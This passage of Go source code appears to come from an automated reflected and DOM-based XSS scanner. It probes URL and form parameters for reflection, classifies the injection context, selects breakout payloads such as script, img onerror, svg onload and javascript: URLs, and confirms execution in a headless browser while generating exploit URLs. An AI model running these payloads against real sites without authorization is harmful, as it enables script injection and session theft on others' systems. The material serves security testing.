	}
	
	// Parse the endpoint URL
	parsedURL, err := url.Parse(endpoint)
	if err != nil {
		if !s.config.Quiet {
			log.Printf("Error parsing endpoint URL %s: %v", endpoint, err)
		}
		return
	}
	
	// Extract query parameters from endpoint
	queryParams := parsedURL.Query()
	if len(queryParams) == 0 {
		// Add a test parameter to the endpoint
		query := parsedURL.Query()
		query.Set("test", "XSS_TEST_ENDPOINT")
		parsedURL.RawQuery = query.Encode()
		endpoint = parsedURL.String()
	}
	
	// Test the endpoint
	content, err := s.getPageContent(endpoint)
	if err != nil {
		if !s.config.Quiet {
			log.Printf("Error fetching endpoint %s: %v", endpoint, err)
		}
		return
	}
	
	// Check if the test value reflects in the response
	testValue := "XSS_TEST_ENDPOINT"
	if strings.Contains(strings.ToLower(content), strings.ToLower(testValue)) {
		if !s.config.Quiet {
			log.Printf("Endpoint %s reflects test value - potential XSS target", endpoint)
		}
		
		// Test with XSS payloads
		s.testEndpointWithPayloads(endpoint, testValue)
	}
}

// testEndpointWithPayloads tests an endpoint with XSS payloads
func (s *Scanner) testEndpointWithPayloads(endpoint, testValue string) {
	// Basic XSS payloads for testing
	payloads := []string{
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"javascript:alert(1)",
		"\" onmouseover=\"alert(1)\"",
		"' onmouseover='alert(1)'",
		"</script><script>alert(1)</script>",
	}
	
	for _, payload := range payloads {
		// Replace test value with payload in endpoint
		testURL := strings.Replace(endpoint, testValue, payload, -1)
		
		// Test the payload
		content, err := s.getPageContent(testURL)
		if err != nil {
			continue
		}
		
		// Check if payload reflects in response
		if strings.Contains(content, payload) {
			if !s.config.Quiet {
				log.Printf("VULNERABILITY FOUND in endpoint %s with payload: %s", endpoint, payload)
			}
			
			// Test with headless browser
			ctx, cancel := context.WithTimeout(context.Background(), s.config.Timeout)
			defer cancel()
			
			browser := headless.NewBrowser()
			defer browser.Close()
			
			alertDetected, err := browser.TestXSSPayloadWithMethod(ctx, testURL, "", payload, nil, "GET")
			if err == nil && alertDetected {
				if !s.config.Quiet {
					log.Printf("CONFIRMED XSS VULNERABILITY in endpoint %s", endpoint)
				}
				break // Stop testing this endpoint after first confirmed vulnerability
			}
		}
	}
}

// testParameterReflection tests if a parameter reflects in the response
func (s *Scanner) testParameterReflection(parsedURL *url.URL, param Parameter) (bool, string, error) {
	testValue := "surajishere"
	
	var testURL *url.URL
	var err error

	// Handle different parameter types
	switch param.Type {
	case "query":
		// Create test URL with query parameter
		testURL = &url.URL{}
		*testURL = *parsedURL
		query := testURL.Query()
		query.Set(param.Name, testValue)
		testURL.RawQuery = query.Encode()
		
	case "fragment":
		// Create test URL with fragment
		testURL = &url.URL{}
		*testURL = *parsedURL
		testURL.Fragment = testValue
		
	case "hidden":
		// For hidden parameters, we need to test them as query parameters
		// since we can't directly test hidden form fields without form submission
		testURL = &url.URL{}
		*testURL = *parsedURL
		query := testURL.Query()
		query.Set(param.Name, testValue)
		testURL.RawQuery = query.Encode()
		
	case "form":
		// For form parameters, we need to test them with POST requests
		testURL = parsedURL
		
	// JavaScript parameter types - test as query parameters
	case "js_url", "js_function", "js_object", "js_ajax", "js_formdata", 
		 "js_urlsearchparams", "js_route", "js_querystring", "js_location", "js_hash":
		testURL = &url.URL{}
		*testURL = *parsedURL
		query := testURL.Query()
		query.Set(param.Name, testValue)
		testURL.RawQuery = query.Encode()
		
	case "ajax":
		// AJAX parameters - test as query parameters
		testURL = &url.URL{}
		*testURL = *parsedURL
		query := testURL.Query()
		query.Set(param.Name, testValue)
		testURL.RawQuery = query.Encode()
		
	case "route":
		// Route parameters - test as query parameters
		testURL = &url.URL{}
		*testURL = *parsedURL
		query := testURL.Query()
		query.Set(param.Name, testValue)
		testURL.RawQuery = query.Encode()
		
	default:
		// Default to query parameter testing
		testURL = &url.URL{}
		*testURL = *parsedURL
		query := testURL.Query()
		query.Set(param.Name, testValue)
		testURL.RawQuery = query.Encode()
	}

	if !s.config.Quiet {
		log.Printf("Testing parameter reflection: %s (type: %s) with value: %s", param.Name, param.Type, testValue)
		log.Printf("Test URL: %s", testURL.String())
	}

	// Make request - handle POST for form parameters
	var resp *http.Response
	if param.Type == "form" {
		resp, err = s.makePostRequest(testURL.String(), param.Name, testValue)
	} else {
		resp, err = s.makeRequest(testURL.String())
	}
	if err != nil {
		if !s.config.Quiet {
			log.Printf("Error making request: %v", err)
		}
		return false, "", err
	}
	defer resp.Body.Close()

	// Check if test value reflects in response
	body, err := s.readResponseBody(resp)
	if err != nil {
		if !s.config.Quiet {
			log.Printf("Error reading response body: %v", err)
		}
		return false, "", err
	}

	if !s.config.Quiet {
		log.Printf("Response body length: %d", len(body))
		if len(body) > 200 {
			log.Printf("Response preview: %s...", body[:200])
		} else {
			log.Printf("Response: %s", body)
		}
	}

	// Enhanced reflection detection
	reflects, context := s.detectReflection(body, testValue)
	
	// Debug logging for context detection
	if !s.config.Quiet {
		log.Printf("Context detection result: %s", context)
	}
	
	if !reflects {
		if !s.config.Quiet {
			log.Printf("Parameter %s does not reflect in response", param.Name)
			log.Printf("Response body length: %d", len(body))
			if len(body) < 500 {
				log.Printf("Response preview: %s", body)
			}
		}
		return false, "", nil
	}

	if !s.config.Quiet {
		log.Printf("Parameter %s reflects in response (context: %s)", param.Name, context)
	}

	// Store the response body for context detection
	s.lastResponseBody = body

	return true, context, nil
}

// detectReflection performs comprehensive reflection detection
func (s *Scanner) detectReflection(body, testValue string) (bool, string) {
	// Normalize for case-insensitive search
	bodyLower := strings.ToLower(body)
	testValueLower := strings.ToLower(testValue)
	
	// Check if the test value is present in the response
	if !strings.Contains(bodyLower, testValueLower) {
		return false, ""
	}
	
	// Determine the context of reflection
	context := s.detectReflectionContext(body, testValue)
	return true, context
}

// testDOMBasedReflection tests if a parameter reflects in DOM manipulation
func (s *Scanner) testDOMBasedReflection(parsedURL *url.URL, param Parameter) (bool, string, error) {
	// This is specifically for fragment-based parameters or parameters that might be used in DOM manipulation
	if param.Type != "fragment" {
		return false, "", nil
	}

	testValue := "surajishere"
	
	// Create test URL with fragment
	testURL := &url.URL{}
	*testURL = *parsedURL
	testURL.Fragment = testValue

	if !s.config.Quiet {
		log.Printf("Testing DOM-based reflection for fragment parameter: %s", param.Name)
		log.Printf("Test URL: %s", testURL.String())
	}

	// Make request
	resp, err := s.makeRequest(testURL.String())
	if err != nil {
		return false, "", err
	}
	defer resp.Body.Close()

	// Read response body
	body, err := s.readResponseBody(resp)
	if err != nil {
		return false, "", err
	}

	// Check for DOM manipulation patterns that use the fragment
	domPatterns := []string{
		"window.location.hash",
		"location.hash",
		"document.location.hash",
		"location.hash.substring",
		"window.location.hash.substring",
		"document.writeln",
		"document.write",
		"innerhtml",
		"outerhtml",
		"insertadjacenthtml",
		"createelement",
		"appendchild",
		"insertbefore",
		"replacechild",
		"setattribute",
	}

	bodyLower := strings.ToLower(body)
	for _, pattern := range domPatterns {
		if strings.Contains(bodyLower, pattern) {
			if !s.config.Quiet {
				log.Printf("Found DOM manipulation pattern: %s", pattern)
			}
			return true, string(ContextDOMBased), nil
		}
	}

	return false, "", nil
}

// testXSSPayloads tests various XSS payloads against a parameter
func (s *Scanner) testXSSPayloads(ctx context.Context, parsedURL *url.URL, param Parameter, context HTMLContext) (*Vulnerability, error) {
	
	// First, analyze the reflection context to determine the most effective payloads
	contextAnalysis := s.analyzeReflectionContext(parsedURL, param, context)
	
	// Generate context-specific payloads
	payloads := s.generateContextSpecificPayloads(contextAnalysis)
		if !s.config.Quiet {
			log.Printf("Generated %d context-specific payloads", len(payloads))
	}
	
	if !s.config.Quiet {
		log.Printf("Context analysis for parameter %s: %+v", param.Name, contextAnalysis)
		log.Printf("Selected %d context-specific payloads for testing", len(payloads))
	}
	
	var workingPayloads []string
	var exploitURL string

	for _, payload := range payloads {
		select {
		case <-ctx.Done():
			return nil, ctx.Err()
		default:
		}

		// Test payload
		working, err := s.testPayload(ctx, parsedURL, param, payload)
		if err != nil {
			continue
		}

		if working {
			workingPayloads = append(workingPayloads, payload)
			
			// Generate exploit URL
			if exploitURL == "" {
				exploitURL = s.generateExploitURL(parsedURL, param, payload)
			}

			// Early termination: if one payload works, stop testing more
			if !s.config.Quiet {
				log.Printf("Payload triggered alert: %s - stopping further payload testing for parameter %s", payload, param.Name)
			}
			break
		}
	}

	if len(workingPayloads) == 0 {
		return nil, nil
	}

	// Determine exploitability flags
	isDirectlyExploitable, manualInterventionRequired := s.determineExploitability(context)

	// Determine HTTP method based on parameter type
	method := "GET"
	if param.Type == "form" {
		method = "POST"
	}

	return &Vulnerability{
		Parameter:              param.Name,
		Context:                string(context),
		WorkingPayloads:        workingPayloads,
		ExploitURL:             exploitURL,
		Method:                 method,
		IsDirectlyExploitable:  isDirectlyExploitable,
		ManualInterventionRequired: manualInterventionRequired,
		Confidence:             "high",
	}, nil
}

// testPayload tests a single XSS payload using only headless browser
func (s *Scanner) testPayload(ctx context.Context, parsedURL *url.URL, param Parameter, payload string) (bool, error) {
	defer func() {
		if r := recover(); r != nil {
		}
	}()
	
	// Minimal logging in testPayload
	
	// Only use headless browser for XSS detection
	if s.config.Headless && s.headless != nil {
		// Minimal
		
		// Test with headless browser only
		alertDetected, err := s.testPayloadHeadless(ctx, parsedURL, param, payload)
		if err != nil {
			if !s.config.Quiet {
				log.Printf("Headless browser failed for payload %s: %v", payload, err)
			}
			return false, err
		}
		
		if !s.config.Quiet {
			log.Printf("Headless browser result for payload %s: alertDetected=%v", payload, alertDetected)
		}
		
		return alertDetected, nil
	}
	
	// If headless browser is not available, return error
	return false, fmt.Errorf("headless browser is required for XSS detection")
}

// testPayloadHeadless tests if a payload triggers an alert using headless browser
func (s *Scanner) testPayloadHeadless(ctx context.Context, parsedURL *url.URL, param Parameter, payload string) (bool, error) {
	// Reduced verbosity for headless call
	
	// Create base URL without query parameters
	baseURL := parsedURL.Scheme + "://" + parsedURL.Host + parsedURL.Path
	
	// Determine HTTP method based on parameter type
	method := "GET"
	if param.Type == "form" {
		method = "POST"
	}
	
	// Test with headless browser
	// Reduced verbosity
	if s.headless == nil {
		// Noisy log removed
		return false, fmt.Errorf("headless browser instance is nil")
	}
	alertDetected, err := s.headless.TestXSSPayloadWithMethod(ctx, baseURL, param.Name, payload, s.config.Headers, method)
	if err != nil {
		return false, err
	}
	
	return alertDetected, nil
}

// testPayloadReflection tests if a payload reflects without browser
func (s *Scanner) testPayloadReflection(parsedURL *url.URL, param Parameter, payload string) (bool, error) {
	testURL := *parsedURL
	query := testURL.Query()
	query.Set(param.Name, payload)
	testURL.RawQuery = query.Encode()

	resp, err := s.makeRequest(testURL.String())
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	body, err := s.readResponseBody(resp)
	if err != nil {
		return false, err
	}

	// Check if payload reflects (basic check)
	return strings.Contains(body, payload), nil
}



// analyzeReflectionContext performs detailed analysis of reflection context
func (s *Scanner) analyzeReflectionContext(parsedURL *url.URL, param Parameter, context HTMLContext) *ContextAnalysis {
	if !s.config.Quiet {
	}
	analysis := &ContextAnalysis{
		ContextType: context,
	}
	
	// Get the response body that was stored during reflection testing
	if s.lastResponseBody == "" {
		// If no response body stored, fetch it again
		testValue := "surajishere"
		testURL := *parsedURL
		query := testURL.Query()
		query.Set(param.Name, testValue)
		testURL.RawQuery = query.Encode()
		
		resp, err := s.makeRequest(testURL.String())
		if err == nil {
			defer resp.Body.Close()
			body, _ := s.readResponseBody(resp)
			s.lastResponseBody = body
		}
	}
	
	if s.lastResponseBody == "" {
		// Fallback to basic analysis
		return s.basicContextAnalysis(context)
	}
	
	// Find the reflection point
	testValue := "surajishere"
	bodyLower := strings.ToLower(s.lastResponseBody)
	testValueLower := strings.ToLower(testValue)
	
	payloadIndex := strings.Index(bodyLower, testValueLower)
	if payloadIndex == -1 {
		return s.basicContextAnalysis(context)
	}
	
	// Get context area around the payload
	start := max(0, payloadIndex-200)
	end := min(len(s.lastResponseBody), payloadIndex+len(testValue)+200)
	contextArea := s.lastResponseBody[start:end]
	contextAreaLower := strings.ToLower(contextArea)
	
	// Analyze the specific context
	s.analyzeSpecificContext(analysis, contextAreaLower, testValueLower)
	
	return analysis
}

// analyzeSpecificContext analyzes the specific reflection context
func (s *Scanner) analyzeSpecificContext(analysis *ContextAnalysis, contextAreaLower, testValueLower string) {
	// Handle basic contexts that require breakout - set payloads but don't return early
	// Use string comparison since context type comes from string detection
	contextTypeStr := string(analysis.ContextType)
	
	// Debug logging
	if !s.config.Quiet {
	}
	
	if !s.config.Quiet {
	}
	switch contextTypeStr {
	case "textarea":
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = "</textarea>"
		analysis.RecommendedPayloads = []string{
			"</textarea><script>alert(1)</script>",
			"</textarea><img src=x onerror=alert(1)>",
		}
		return
	case "noscript":
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = "</noscript>"
		analysis.RecommendedPayloads = []string{
			"</noscript><script>alert(1)</script>",
			"'</noscript><script>alert(1)</script>",
			"\"</noscript><script>alert(1)</script>",
		}
		return
	case "textarea_attribute":
		analysis.IsAttributeValue = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = "'>"
		analysis.RecommendedPayloads = []string{
			"'></textarea><script>alert(1)</script>",
			"></textarea><script>alert(1)</script>",
		}
		return
	case "style_attribute":
		analysis.IsAttributeValue = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = "'>"
		analysis.RecommendedPayloads = []string{
			"'></style><script>alert(1)</script>",
			"'></style><img src=x onerror=alert(1)>",
			"'><script>alert(1)</script>",
			"' onerror=alert(1)",
		}
		return
	case "iframe_attribute":
		analysis.IsAttributeValue = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = "'>"
		analysis.RecommendedPayloads = []string{
			"'></iframe><script>alert(1)</script>",
			"'></iframe><img src=x onerror=alert(1)>",
			"'></iframe><svg onload=alert(1)>",
			"'><script>alert(1)</script>",
			"'><img src=x onerror=alert(1)>",
			"'><svg onload=alert(1)>",
			"' onerror=alert(1)",
			"' onload=alert(1)",
		}
		return
	case "css_expression", "css":
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = "</style>"
		analysis.RecommendedPayloads = []string{
			"</style><script>alert(1)</script>",
			"</style><img src=x onerror=alert(1)>",
			"</style><svg onload=alert(1)>",
		}
		return
	case "js_assignment", "javascript":
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = ";"
		analysis.RecommendedPayloads = []string{
			";alert(1)//",
			"-alert(1)//",
			"alert(1)//",
			"';alert(1)//",
			"\";alert(1)//",
		}
		return
	case "js_comment":
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = "*/"
		analysis.RecommendedPayloads = []string{
			"*/alert(1);/*",
			"*/alert(document.domain);/*",
			"*/alert(document.cookie);/*",
			"*/eval('alert(1)');/*",
		}
		return
	case "html_comment":
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = "-->"
		analysis.RecommendedPayloads = []string{
			"--><script>alert(1)</script>",
			"--><img src=x onerror=alert(1)>",
			"--><svg onload=alert(1)>",
		}
		return
	case "html_title":
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = "</title>"
		analysis.RecommendedPayloads = []string{
			"</title><script>alert(1)</script>",
			"</title><img src=x onerror=alert(1)>",
			"</title><svg onload=alert(1)>",
		}
		return
	case "html_attribute_name", "html_attribute_name_unquoted":
		analysis.IsAttributeName = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = ">"
		analysis.RecommendedPayloads = []string{
			"><script>alert(1)</script>",
			"><img src=x onerror=alert(1)>",
			"><svg onload=alert(1)>",
			" onload=alert(1)",
		}
		return
	}
	// Check for iframe srcdoc attribute (most critical for XSS)
	if regexp.MustCompile(`<iframe[^>]*srcdoc\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["'][^>]*>`).MatchString(contextAreaLower) {
		analysis.TagName = "iframe"
		analysis.AttributeName = "srcdoc"
		analysis.IsAttributeValue = true
		analysis.IsExecutable = true
		analysis.ExecutableContext = "srcdoc"
		analysis.RequiresBreakout = true
		// Determine quote type for srcdoc
		if regexp.MustCompile(`<iframe[^>]*srcdoc\s*=\s*'[^']*` + regexp.QuoteMeta(testValueLower) + `[^']*'[^>]*>`).MatchString(contextAreaLower) {
			analysis.QuoteType = "single"
			analysis.BreakoutSequence = "'>"
			analysis.RecommendedPayloads = []string{
				"'><script>alert(1)</script>",
				"'><img src=x onerror=alert(1)>",
				"'><svg onload=alert(1)>",
				"' onload=alert(1)",
			}
		} else if regexp.MustCompile(`<iframe[^>]*srcdoc\s*=\s*"[^"]*` + regexp.QuoteMeta(testValueLower) + `[^"]*"[^>]*>`).MatchString(contextAreaLower) {
			analysis.QuoteType = "double"
			analysis.BreakoutSequence = "\">"
			analysis.RecommendedPayloads = []string{
				"\"><script>alert(1)</script>",
				"\"><img src=x onerror=alert(1)>",
				"\"><svg onload=alert(1)>",
				"\" onload=alert(1)",
			}
		} else {
			analysis.QuoteType = "unquoted"
			analysis.BreakoutSequence = ">"
			analysis.RecommendedPayloads = []string{
				"><script>alert(1)</script>",
				"><img src=x onerror=alert(1)>",
				"><svg onload=alert(1)>",
				" onload=alert(1)>",
			}
		}
		return
	}
	
	// COMPREHENSIVE ATTRIBUTE CONTEXT DETECTION
	// Order matters - most specific contexts first to avoid conflicts
	
	// 1. Check for textarea attribute (specific to textarea tags)
	if regexp.MustCompile(`<textarea[^>]*\w+\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["'][^>]*>`).MatchString(contextAreaLower) {
		if !s.config.Quiet {
		}
		analysis.TagName = "textarea"
		analysis.IsAttributeValue = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		
		// Determine quote type for textarea attribute
		if regexp.MustCompile(`<textarea[^>]*\w+\s*=\s*'[^']*` + regexp.QuoteMeta(testValueLower) + `[^']*'[^>]*>`).MatchString(contextAreaLower) {
			analysis.QuoteType = "single"
			analysis.BreakoutSequence = "'>"
			analysis.RecommendedPayloads = []string{
				"'></textarea><script>alert(1)</script>",
				"'></textarea><img src=x onerror=alert(1)>",
				"'><script>alert(1)</script>",
				"'><img src=x onerror=alert(1)>",
			}
		} else {
			analysis.QuoteType = "double"
			analysis.BreakoutSequence = "\">"
			analysis.RecommendedPayloads = []string{
				"\"></textarea><script>alert(1)</script>",
				"\"></textarea><img src=x onerror=alert(1)>",
				"\"><script>alert(1)</script>",
				"\"><img src=x onerror=alert(1)>",
			}
		}
		return
	}
	
	// 2. Check for script src attribute (specific to script tags with src)
	if regexp.MustCompile(`<script[^>]*src\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["'][^>]*/?>`).MatchString(contextAreaLower) {
		if !s.config.Quiet {
		}
		analysis.TagName = "script"
		analysis.AttributeName = "src"
		analysis.IsAttributeValue = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		
		// Determine quote type for script src
		if regexp.MustCompile(`<script[^>]*src\s*=\s*'[^']*` + regexp.QuoteMeta(testValueLower) + `[^']*'[^>]*/?>`).MatchString(contextAreaLower) {
			analysis.QuoteType = "single"
			analysis.BreakoutSequence = "'>"
			analysis.RecommendedPayloads = []string{
				"'></script><script>alert(1)</script><script src='",
				"'><script>alert(1)</script>",
				"https://14.rs",
				"'><img src=x onerror=alert(1)>",
			}
		} else {
			analysis.QuoteType = "double"
			analysis.BreakoutSequence = "\">"
			analysis.RecommendedPayloads = []string{
				"\"></script><script>alert(1)</script><script src=\"",
				"\"><script>alert(1)</script>",
				"https://14.rs",
				"\"><img src=x onerror=alert(1)>",
			}
		}
		return
	}
	
	// 3. Check for iframe src attribute (specific to iframe tags with src)
	if regexp.MustCompile(`<iframe[^>]*src\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["'][^>]*>`).MatchString(contextAreaLower) {
		if !s.config.Quiet {
		}
		analysis.TagName = "iframe"
		analysis.AttributeName = "src"
		analysis.IsAttributeValue = true
		analysis.IsExecutable = true
		analysis.ExecutableContext = "javascript:"
		analysis.RequiresBreakout = false
		analysis.RecommendedPayloads = []string{
			"javascript:alert(1)",
			"data:text/html,<script>alert(1)</script>",
		}
		return
	}
	
	// 4. Check for iframe attribute (non-src iframe attributes)
	if regexp.MustCompile(`<iframe[^>]*\w+\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["'][^>]*>`).MatchString(contextAreaLower) {
		if !s.config.Quiet {
		}
		analysis.TagName = "iframe"
		analysis.IsAttributeValue = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		
		// Determine quote type for iframe attribute
		if regexp.MustCompile(`<iframe[^>]*\w+\s*=\s*'[^']*` + regexp.QuoteMeta(testValueLower) + `[^']*'[^>]*>`).MatchString(contextAreaLower) {
			analysis.QuoteType = "single"
			analysis.BreakoutSequence = "'>"
			analysis.RecommendedPayloads = []string{
				"'></iframe><script>alert(1)</script>",
				"'></iframe><img src=x onerror=alert(1)>",
				"'><script>alert(1)</script>",
				"'><img src=x onerror=alert(1)>",
			}
		} else {
			analysis.QuoteType = "double"
			analysis.BreakoutSequence = "\">"
			analysis.RecommendedPayloads = []string{
				"\"></iframe><script>alert(1)</script>",
				"\"></iframe><img src=x onerror=alert(1)>",
				"\"><script>alert(1)</script>",
				"\"><img src=x onerror=alert(1)>",
			}
		}
		return
	}
	
	// 5. Check for style attribute (specific to style attributes)
	if regexp.MustCompile(`<[^>]*style\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["'][^>]*>`).MatchString(contextAreaLower) {
		if !s.config.Quiet {
		}
		analysis.IsAttributeValue = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = "</style>"
		analysis.RecommendedPayloads = []string{
			"</style><script>alert(1)</script>",
			"</style><img src=x onerror=alert(1)>",
			"</style><svg onload=alert(1)>",
		}
		return
	}
	
	// Check for attribute name context
	if regexp.MustCompile(`<[^>]*\s+` + regexp.QuoteMeta(testValueLower) + `\s*=\s*["'][^"']*["'][^>]*>`).MatchString(contextAreaLower) {
		analysis.IsAttributeName = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = ">"
		analysis.RecommendedPayloads = []string{
			"><script>alert(1)</script>",
			"><img src=x onerror=alert(1)>",
		}
		return
	}
	
	// Check for script tag context
	if regexp.MustCompile(`<script[^>]*>.*` + regexp.QuoteMeta(testValueLower) + `.*</script>`).MatchString(contextAreaLower) {
		analysis.IsInScript = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = false
		analysis.RecommendedPayloads = []string{
			"alert(1)",
			"eval('alert(1)')",
			// Add literal/escape and tag-breakout variants to handle slash-quoted strings
			"';alert(1)//",
			"\";alert(1)//",
			"</script><script>alert(1)</script>",
		}
		return
	}
	
	// Check for event handler context
	// Check for quoted event handlers
	if regexp.MustCompile(`(?:onload|onclick|onmouseover|onerror|onfocus|onblur)\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["']`).MatchString(contextAreaLower) {
		analysis.IsInEvent = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = false
		analysis.RecommendedPayloads = []string{
			"alert(1)",
			"eval('alert(1)')",
		}
		return
	}
	
	// Check for unquoted event handlers (e.g., onclick=alert(1))
	if regexp.MustCompile(`(?:onload|onclick|onmouseover|onerror|onfocus|onblur)\s*=\s*` + regexp.QuoteMeta(testValueLower) + `(?:[^>]*>|[\s/>])`).MatchString(contextAreaLower) {
		analysis.IsInEvent = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = false
		analysis.RecommendedPayloads = []string{
			"alert(1)",
			"eval('alert(1)')",
		}
		return
	}
	
	// Check for URL context
	if regexp.MustCompile(`(?:href|src|action)\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["']`).MatchString(contextAreaLower) {
		analysis.IsInURL = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = false
		analysis.ExecutableContext = "javascript:"
		analysis.RecommendedPayloads = []string{
			"javascript:alert(1)",
			"data:text/html,<script>alert(1)</script>",
		}
		return
	}
	
	// Check for CSS context
	if regexp.MustCompile(`style\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["']`).MatchString(contextAreaLower) {
		analysis.IsInCSS = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = false
		analysis.RecommendedPayloads = []string{
			"expression(alert(1))",
			"javascript:alert(1)",
		}
		return
	}
	
	// Check for HTML comment context
	if regexp.MustCompile(`<!--.*` + regexp.QuoteMeta(testValueLower) + `.*-->`).MatchString(contextAreaLower) {
		analysis.IsInComment = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = "-->"
		analysis.RecommendedPayloads = []string{
			"--><script>alert(1)</script>",
			"--><img src=x onerror=alert(1)>",
		}
		return
	}
	
	// Check for title tag context
	if regexp.MustCompile(`<title[^>]*>.*` + regexp.QuoteMeta(testValueLower) + `.*</title>`).MatchString(contextAreaLower) {
		analysis.IsInTitle = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = "</title>"
		analysis.RecommendedPayloads = []string{
			"</title><script>alert(1)</script>",
			"</title><img src=x onerror=alert(1)>",
		}
		return
	}
	
	// Check for generic attribute context
	if regexp.MustCompile(`\w+\s*=\s*["'][^"']*` + regexp.QuoteMeta(testValueLower) + `[^"']*["']`).MatchString(contextAreaLower) {
		analysis.IsAttributeValue = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		
		// Determine quote type
		if regexp.MustCompile(`\w+\s*=\s*'[^']*` + regexp.QuoteMeta(testValueLower) + `[^']*'`).MatchString(contextAreaLower) {
			analysis.QuoteType = "single"
			analysis.BreakoutSequence = "'>"
			analysis.RecommendedPayloads = []string{
				"'><script>alert(1)</script>",
				"' onerror=alert(1)",
			}
		} else {
			analysis.QuoteType = "double"
			analysis.BreakoutSequence = "\">"
			analysis.RecommendedPayloads = []string{
				"\"><script>alert(1)</script>",
				"\" onerror=alert(1)",
			}
		}
		return
	}
	
	// Check for unquoted attribute context
	if regexp.MustCompile(`\w+\s*=\s*` + regexp.QuoteMeta(testValueLower) + `(?:[^>]*>|[\s/>])`).MatchString(contextAreaLower) {
		analysis.IsAttributeValue = true
		analysis.QuoteType = "unquoted"
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = ">"
		analysis.RecommendedPayloads = []string{
			"><script>alert(1)</script>",
			" onerror=alert(1)>",
		}
		return
	}
	
	// Default to HTML body context
	analysis.IsExecutable = true
	analysis.RequiresBreakout = false
	analysis.RecommendedPayloads = []string{
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
	}
}

// basicContextAnalysis provides basic analysis when detailed analysis fails
func (s *Scanner) basicContextAnalysis(context HTMLContext) *ContextAnalysis {
	analysis := &ContextAnalysis{
		ContextType: context,
	}
	
	switch context {
	case ContextIframeSrcdoc:
		analysis.TagName = "iframe"
		analysis.AttributeName = "srcdoc"
		analysis.IsAttributeValue = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.QuoteType = "double" // Default to double-quoted
		analysis.BreakoutSequence = "\">"
		analysis.RecommendedPayloads = []string{
			"\"><script>alert(1)</script>",
			"\"><img src=x onerror=alert(1)>",
			"\"><svg onload=alert(1)>",
			"\" onload=alert(1)",
		}
	case ContextIframeSrc:
		analysis.TagName = "iframe"
		analysis.AttributeName = "src"
		analysis.IsAttributeValue = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = false
		analysis.RecommendedPayloads = []string{
			"javascript:alert(1)",
			"data:text/html,<script>alert(1)</script>",
		}
	case ContextIframeAttribute:
		analysis.TagName = "iframe"
		analysis.IsAttributeValue = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = "'>"
		analysis.RecommendedPayloads = []string{
			"'></iframe><script>alert(1)</script>",
			"'></iframe><img src=x onerror=alert(1)>",
			"'></iframe><svg onload=alert(1)>",
			"'><script>alert(1)</script>",
			"'><img src=x onerror=alert(1)>",
			"'><svg onload=alert(1)>",
			"' onerror=alert(1)",
			"' onload=alert(1)",
		}
	case ContextHTMLAttributeSingleQuoted:
		analysis.IsAttributeValue = true
		analysis.QuoteType = "single"
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = "'>"
		analysis.RecommendedPayloads = []string{
			"'><img src=x onerror=alert(1)>",
			"'><svg onload=alert(1)>",
			"'><script>alert(1)</script>",
			"' onload=alert(1)",
		}
	case ContextHTMLAttributeDoubleQuoted:
		analysis.IsAttributeValue = true
		analysis.QuoteType = "double"
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = "\">"
		analysis.RecommendedPayloads = []string{
			"\"><script>alert(1)</script>",
			"\" onerror=alert(1)",
		}
	case ContextHTMLAttributeUnquoted:
		analysis.IsAttributeValue = true
		analysis.QuoteType = "unquoted"
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
		analysis.BreakoutSequence = ">"
		analysis.RecommendedPayloads = []string{
			"><script>alert(1)</script>",
			" onerror=alert(1)>",
		}
	case ContextHTMLAttributeName:
		analysis.IsAttributeName = true
		analysis.IsExecutable = true
		analysis.RequiresBreakout = true
